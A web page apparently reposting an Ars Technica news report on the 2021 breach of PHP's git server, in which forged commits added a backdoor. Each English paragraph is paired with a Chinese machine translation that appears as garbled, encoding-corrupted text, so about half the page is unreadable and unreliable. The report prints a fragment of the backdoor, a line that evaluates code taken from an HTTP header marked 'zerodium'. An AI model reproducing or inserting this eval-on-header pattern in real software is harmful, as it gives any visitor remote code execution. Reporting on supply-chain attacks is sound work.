<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>ç ´åå†…éƒ¨GITæœåŠ¡å™¨åçš„é»‘å®¢åé—¨PHPæºä»£ç  Hackers backdoor PHP source code after breaching internal git server</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">Hackers backdoor PHP source code after breaching internal git server<br/>ç ´åå†…éƒ¨GITæœåŠ¡å™¨åçš„é»‘å®¢åé—¨PHPæºä»£ç  </h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2021-03-30 03:33:37</div><div class="story_img_container"><a href="http://img2.diglog.com/img/2021/3/4ac3656334aeb07fb2b58b3cb294eaf9.jpeg"><img src="http://img2.diglog.com/img/2021/3/4ac3656334aeb07fb2b58b3cb294eaf9.jpeg" class="img-fluid my_story_img" onerror="this.style.display='none'"></a></div><div class="page_narrow text-break page_content"><p>A hacker compromised the server used to distribute the PHP programming language and added a backdoor to source code that would have made websites vulnerable to complete takeover, members of the open source project said.</p><p>ä¸€ä¸ªé»‘å®¢æŸå¤±äº†ç”¨äºåˆ†å‘PHPç¼–ç¨‹è¯­è¨€çš„æœåŠ¡å™¨ï¼Œå¹¶æ·»åŠ äº†ä¸€ä¸ªåé—¨åˆ°æºä»£ç ï¼Œè¯¥æºä»£ç å°†ä½¿ç½‘ç«™æ˜“å—å®Œæˆæ”¶è´­ï¼Œå¼€æºé¡¹ç›®çš„æˆå‘˜è¡¨ç¤ºã€‚</p><p> Two updates pushed to the PHP Git server over the weekend added a line that, if run by a PHP-powered website, would have allowed visitors with no authorization to execute code of their choice. The malicious commits  here and  here gave the code the code-injection capability to visitors who had the word â€œzerodiumâ€ in an HTTP header.</p><p> åœ¨å‘¨æœ«æ¨åŠ¨åˆ°PHP GitæœåŠ¡å™¨çš„ä¸¤ä¸ªæ›´æ–°å¢åŠ äº†ä¸€æ¡çº¿ï¼Œå¦‚æœç”±PHPä¾›ç”µçš„ç½‘ç«™è¿è¡Œï¼Œåˆ™å…è®¸è®¿é—®è€…æ²¡æœ‰æˆæƒæ¥æ‰§è¡Œå…¶é€‰æ‹©ä»£ç ã€‚è¿™é‡Œçš„æ¶æ„æäº¤ï¼Œè¿™é‡Œç»™äº†åœ¨HTTPæ ‡å¤´ä¸­æœ‰â€œZerodiumâ€è¿™ä¸ªè¯çš„ä»£ç æ³¨å°„åŠŸèƒ½ã€‚</p><p>  The commits were made to the php-src repo under the account names of two well-known PHP developers, Rasmus Lerdorf and Nikita Popov. â€œWe don&#39;t yet know how exactly this happened, but everything points towards a compromise of the git.php.net server (rather than a compromise of an individual git account),â€ Popov wrote in a  notice published on Sunday night.</p><p>  åœ¨ä¸¤ä¸ªä¼—æ‰€å‘¨çŸ¥çš„PHPå¼€å‘äººå‘˜ï¼ŒRasmus Lerdorfå’ŒNikita Popovçš„è´¦æˆ·åç§°ä¸‹ï¼Œå‘PHP-SRCæŠ¼å›è¿›è¡Œã€‚ â€œæˆ‘ä»¬ä¸çŸ¥é“è¿™æ˜¯ç©¶ç«Ÿå‘ç”Ÿäº†ç©¶ç«Ÿå‘ç”Ÿäº†ä»€ä¹ˆï¼Œä½†ä¸€åˆ‡éƒ½æŒ‡å‘Git.php.netæœåŠ¡å™¨çš„å¦¥åï¼ˆè€Œä¸æ˜¯ä¸ªäººgitå¸æˆ·çš„å¦¥åï¼‰ï¼Œâ€æ³¢æ™®å¤«åœ¨æ˜ŸæœŸå¤©æ™šä¸Šå‘è¡¨çš„é€šçŸ¥ä¸­å†™é“ã€‚</p><p> In the aftermath of the compromise, Popov said that PHP maintainers have concluded that their standalone Git infrastructure is an unnecessary security risk. As a result, they will discontinue the git.php.net server and make GitHub the official source for PHP repositories. Going forward, all PHP source code changes will be made directly to GitHub rather than to git.php.net.</p><p> åœ¨å¦¥åçš„åæœä¸­ï¼Œæ³¢æ³¢å¤«è¯´ï¼ŒPHPç»´æŠ¤äººå‘˜å¾—å‡ºç»“è®ºï¼Œä»–ä»¬ç‹¬ç«‹çš„GITåŸºç¡€è®¾æ–½æ˜¯ä¸å¿…è¦çš„å®‰å…¨é£é™©ã€‚å› æ­¤ï¼Œå®ƒä»¬å°†åœæ­¢Git.php.netæœåŠ¡å™¨å¹¶ä½¿Githubæ˜¯PHPå­˜å‚¨åº“çš„å®˜æ–¹æ¥æºã€‚å±•æœ›æœªæ¥ï¼Œæ‰€æœ‰PHPæºä»£ç æ›´æ”¹å°†ç›´æ¥è½¬åˆ°GitHubè€Œä¸æ˜¯Git.php.netã€‚</p><p> The malicious changes came to public attention no later than Sunday night by developers including Markus Staab, Jake Birchallf, and Michael VoÅ™Ã­Å¡ek as they scrutinized a commit made on Saturday. The update, which purported to fix a typo, was made under an account that used Lerdorfâ€™s name. Shortly after the first discovery, VoÅ™Ã­Å¡ek spotted the second malicious commit, which was made under Popovâ€™s account name. It purported to revert the previous typo fix.</p><p> æ¶æ„å˜åŒ–åœ¨åŒ…æ‹¬Markus Staabï¼ŒJake Birchallfå’ŒMichaelVoÅ¾Ã­Å¡eçš„å¼€å‘äººå‘˜ä¹‹åä¸è¿Ÿäºå‘¨æ—¥æ™šä¸Šï¼Œå› ä¸ºä»–ä»¬åœ¨å‘¨å…­å®¡æŸ¥äº†æäº¤çš„æäº¤ã€‚å£°ç§°ä¿®å¤æ‹¼å†™é”™è¯¯çš„æ›´æ–°æ˜¯åœ¨ä½¿ç”¨Lerdorfåç§°çš„å¸æˆ·ä¸‹è¿›è¡Œçš„ã€‚ç¬¬ä¸€æ¬¡å‘ç°åä¸ä¹…ï¼ŒvoÄŸÃ­Å¡ekå‘ç°äº†ç¬¬äºŒæ¬¡æ¶æ„æäº¤ï¼Œè¿™æ˜¯åœ¨æ³¢æ™®æ´›å¤«çš„è´¦æˆ·åç§°ä¸‹åˆ¶é€ çš„ã€‚å®ƒå£°ç§°è¦æ¢å¤ä»¥å‰çš„é”™å­—ä¿®å¤ã€‚</p><p>      onvert_to_string(enc);	if (strstr(Z_STRVAL_P(enc), &#34;zerodium&#34;)) {		zend_try {			zend_eval_string(Z_STRVAL_P(enc)+8, NULL, &#34;REMOVETHIS: sold to zerodium, mid 2017&#34;);</p><p>      onvert_to_stringï¼ˆencï¼‰;ifï¼ˆstrstrï¼ˆz_strval_pï¼ˆencï¼‰ï¼Œï¼†ï¼ƒ34; zerodiumï¼†ï¼ƒ34;ï¼‰ï¼‰{zend_try {zend_eval_stringï¼ˆz_strval_pï¼ˆencï¼‰+8ï¼Œnullï¼Œï¼†ï¼ƒ34; removethisï¼šå–ç»™é›¶äºŒï¼Œ2017å¹´ä¸­æœŸï¼†ï¼ƒ34;ï¼‰;</p><p> Zerodium is a broker that buys exploits from researchers and sells them to government agencies for use in investigations or other purposes. Why the commits referenced Zerodium is not clear. The companyâ€™s CEO, Chaouki Bekrar, on Monday  said on Twitter that it wasnâ€™t involved.</p><p> Zerodiumæ˜¯ä¸€ä½ç»çºªäººï¼Œå¯ä»¥ä»ç ”ç©¶äººå‘˜é‚£é‡Œçˆ†ç‚¸ï¼Œå¹¶å°†ä»–ä»¬é”€å”®ç»™æ”¿åºœæœºæ„ä»¥ç”¨äºè°ƒæŸ¥æˆ–å…¶ä»–ç›®çš„ã€‚ä¸ºä»€ä¹ˆæäº¤å¼•ç”¨çš„zerodiumä¸æ¸…æ¥šã€‚æœ¬å…¬å¸é¦–å¸­æ‰§è¡Œå®˜Chaouki Bekraräºå‘¨ä¸€è¡¨ç¤ºï¼Œåœ¨Twitterä¸Šè¡¨ç¤ºï¼Œå®ƒæ²¡æœ‰æ¶‰åŠã€‚ </p><p> â€œCheers to the troll who put â€˜Zerodiumâ€™ in todayâ€™s PHP git compromised commits,â€ he wrote. â€œObviously, we have nothing to do with this. Likely, the researcher(s) who found this bug/exploit tried to sell it to many entities but none wanted to buy this crap, so they burned it for fun.</p><p>ä»–å†™é“ï¼Œâ€œåœ¨ä»Šå¤©çš„PHP GITå¦¥åçš„çŠ¯ç½ªä¸­æ¬¢å‘¼å¥–é‡‘çš„å·¨é­”ã€‚â€ â€œæ˜¾ç„¶ï¼Œæˆ‘ä»¬ä¸æ­¤æ— å…³ã€‚å¯èƒ½æ˜¯ç ”ç©¶äººå‘˜ï¼Œè°å‘ç°è¿™ä¸ªé”™è¯¯/åˆ©ç”¨è¯•å›¾å°†å…¶å–ç»™è®¸å¤šå®ä½“ï¼Œä½†æ²¡æœ‰æƒ³ä¹°è¿™ä¸ªåºŸè¯ï¼Œæ‰€ä»¥ä»–ä»¬çƒ§æ‰äº†ä¹è¶£ã€‚</p><p> Cheers to the troll who put &#34;Zerodium&#34; in today&#39;s PHP git compromised commits. Obviously, we have nothing to do with this.   Likely, the researcher(s) who found this bug/exploit tried to sell it to many entities but none wanted to buy this crap, so they burned it for fun ğŸ˜ƒ</p><p> æ¬¢å‘¼ï¼†ï¼ƒ34; Zerodiumï¼†ï¼ƒ34çš„å·¨é­”ã€‚ä»Šå¤©ï¼†ï¼ƒ39; s php gitä¼šå—åˆ°å½±å“çš„æäº¤ã€‚æ˜¾ç„¶ï¼Œæˆ‘ä»¬ä¸æ­¤æ— å…³ã€‚å¯èƒ½æ˜¯å‘ç°è¿™ä¸ªé”™è¯¯/åˆ©ç”¨çš„ç ”ç©¶äººå‘˜è¯•å›¾å‘è®¸å¤šå®ä½“å‡ºå”®ï¼Œä½†æ²¡æœ‰æƒ³ä¹°è¿™ä¸ªåºŸè¯ï¼Œæ‰€ä»¥ä»–ä»¬çƒ§æ‰å®ƒçš„ä¹è¶£â™¥</p><p>â€” Chaouki Bekrar (@cBekrar)  March 29, 2021</p><p> -  Chaouki Bekrarï¼ˆ@cbekrarï¼‰3æœˆ29æ—¥ï¼Œ2021å¹´3æœˆ291æ—¥</p><p>  Prior to the compromise, The PHP Group handled all write access to the repository on their own git server http://git.php.net/ using what Popov called a â€œhome-grownâ€ system called Karma. It provided developers different levels of access privileges depending on previous contributions. GitHub, meanwhile had been a mirror repository.</p><p>  åœ¨å¦¥åä¹‹å‰ï¼ŒPHPç»„åœ¨è‡ªå·±çš„Git Server http://git.php.net/ä¸Šå¤„ç†äº†å¯¹å­˜å‚¨åº“çš„æ‰€æœ‰å†™è®¿é—®æƒé™http://git.php.net/ä½¿ç”¨popovç§°ä¸ºkarmaçš„â€œå®¶åº­æˆé•¿â€ç³»ç»Ÿã€‚å®ƒæ ¹æ®ä»¥å‰çš„è´¡çŒ®æä¾›äº†å¼€å‘äººå‘˜ä¸åŒçº§åˆ«çš„è®¿é—®æƒé™ã€‚ä¸æ­¤åŒæ—¶ï¼ŒGitHubæ˜¯é•œåƒå­˜å‚¨åº“ã€‚</p><p> Now, the PHP Group is abandoning the self-hosted and managed git infrastructure and replacing it with GitHub. The change means that GitHub is now the â€œcanonicalâ€ repository. The PHP Group will no longer use the Karma system. Instead, contributors will have to be part of the PHP organization on GitHub and must use two-factor authentication for accounts with the ability to make commits.</p><p> ç°åœ¨ï¼ŒPHPç»„æ­£åœ¨æ”¾å¼ƒè‡ªæ‰˜ç®¡å’Œç®¡ç†çš„GitåŸºç¡€æ¶æ„ï¼Œå¹¶ç”¨GitHubæ›¿æ¢å®ƒã€‚æ›´æ”¹æ„å‘³ç€GitHubç°åœ¨æ˜¯â€œè§„èŒƒâ€å­˜å‚¨åº“ã€‚ PHPç»„å°†ä¸å†ä½¿ç”¨ä¸šåŠ›ç³»ç»Ÿã€‚ç›¸åï¼Œè´¡çŒ®è€…å¿…é¡»æ˜¯GitHubä¸Šçš„PHPç»„ç»‡çš„ä¸€éƒ¨åˆ†ï¼Œå¿…é¡»ä¸ºè´¦æˆ·ä½¿ç”¨åŒå› ç´ èº«ä»½éªŒè¯ï¼Œä»¥ä¾¿å…·æœ‰æäº¤çš„èƒ½åŠ›ã€‚</p><p>  This weekendâ€™s event isnâ€™t the first time php.net servers have been breached with the intent of performing a supply chain attack. In early 2019, the widely used PHP Extension and Application Repository temporarily shut down most of the site after discovering hackers  replaced the main package manager with a malicious one. Group developers said that anyone who had downloaded the package manager in the past six months should get a new copy. PHP runs an estimated  80 percent of websites. There are no reports of websites incorporating the malicious changes into their production environments.</p><p>  æœ¬å‘¨æœ«çš„äº‹ä»¶ä¸æ˜¯ç¬¬ä¸€æ¬¡é€šè¿‡æ‰§è¡Œä¾›åº”é“¾æ”»å‡»çš„æ„å›¾çªç ´PHP.NETæœåŠ¡å™¨ã€‚åœ¨2019å¹´åˆï¼Œå¹¿æ³›ä½¿ç”¨çš„PHPæ‰©å±•å’Œåº”ç”¨å‚¨å­˜åº“åœ¨å‘ç°é»‘å®¢ä»¥æ¶æ„ä¹‹åæ›¿æ¢ä¸ºä¸»åŒ…ç®¡ç†å™¨åæš‚æ—¶å…³é—­äº†å¤§éƒ¨åˆ†ç½‘ç«™ã€‚é›†å›¢å¼€å‘äººå‘˜è¡¨ç¤ºï¼Œåœ¨è¿‡å»å…­ä¸ªæœˆé‡Œä¸‹è½½äº†åŒ…è£¹ç»ç†çš„ä»»ä½•äººéƒ½åº”è¯¥è·å¾—ä¸€ä¸ªæ–°çš„å‰¯æœ¬ã€‚ PHPä¼°è®¡80ï¼…çš„ç½‘ç«™ã€‚æ²¡æœ‰æŠ¥å‘Šå°†æ¶æ„å˜åŒ–çš„ç½‘ç«™çº³å…¥å…¶ç”Ÿäº§ç¯å¢ƒã€‚</p><p> The changes were likely made by people who wanted brag about their unauthorized access to the PHP Git server rather than those trying to actually backdoor websites that used PHP, said HD Moore, co-founder and CEO of network discovery platform Rumble.</p><p> ç½‘ç»œå‘ç°å¹³å°éš†éš†å£°ï¼Œç½‘ç»œå‘ç°å¹³å°éš†éš†å£°æ˜çš„HD Mooreè¡¨ç¤ºï¼Œä»–ä»¬å¸Œæœ›å¹å˜˜ä»–ä»¬æœªç»æˆæƒè®¿é—®PHP GITæœåŠ¡å™¨çš„äººè€Œä¸æ˜¯è¯•å›¾å®é™…æ”¯æŒä½¿ç”¨PHPçš„ç½‘ç«™çš„äººå‘˜çš„å˜åŒ–ã€‚ </p><p> â€œSounds like the attackers are trolling Zerodium or trying to give the impression that the code was backdoored for much longer,â€ he told Ars. â€œEither way, I would be spending a lot of time going through previous commits if I had any security interest in PHP.â€</p><p>â€œå¬èµ·æ¥åƒæ”»å‡»è€…çš„å£°éŸ³æ˜¯æ‹–ç€é›¶æ¯’æ€§ï¼Œæˆ–è€…è¯•å›¾ç»™äººçš„å°è±¡æ˜¯ï¼Œä»£ç è¢«å›å½’å¾—å¤šï¼Œâ€ä»–å‘Šè¯‰arsã€‚ â€œæ— è®ºå¦‚ä½•ï¼Œå¦‚æœæˆ‘å¯¹PHPçš„ä»»ä½•å®‰å…¨å…´è¶£ï¼Œæˆ‘å°†èŠ±è´¹å¤§é‡çš„æ—¶é—´ç»å†äº†å¾ˆå¤šæ—¶é—´ã€‚â€ </p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://arstechnica.com/gadgets/2021/03/hackers-backdoor-php-source-code-after-breaching-internal-git-server/">https://arstechnica.com/gadgets/2021/03/hackers-backdoor-php-source-code-after-breaching-internal-git-server/</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/ä»£ç /">#ä»£ç </a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/é»‘å®¢/">#é»‘å®¢</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/åé—¨/">#åé—¨</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/backdoor/">#backdoor</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/php/">#php</a></button></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è®¾è®¡/">#è®¾è®¡</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åˆ›æ„/">#åˆ›æ„</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ‘„å½±/">#æ‘„å½±</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å›¾ç‰‡/">#å›¾ç‰‡</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ¸¸æˆ/">#æ¸¸æˆ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è½¯ä»¶/">#è½¯ä»¶</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è§†é¢‘/">#è§†é¢‘</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ‰‹æœº/">#æ‰‹æœº</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å¹¿å‘Š/">#å¹¿å‘Š</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ç½‘ç«™/">#ç½‘ç«™</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å…è´¹/">#å…è´¹</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ä¸‹è½½/">#ä¸‹è½½</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å¾®è½¯/">#å¾®è½¯</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è‹¹æœ/">#è‹¹æœ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/éŸ³ä¹/">#éŸ³ä¹</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åšå®¢/">#åšå®¢</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ¶æ/">#æ¶æ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è‰ºæœ¯/">#è‰ºæœ¯</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å·¥å…·/">#å·¥å…·</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åˆ†äº«/">#åˆ†äº«</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy;2012-2021 diglog.com </div></div></body></html>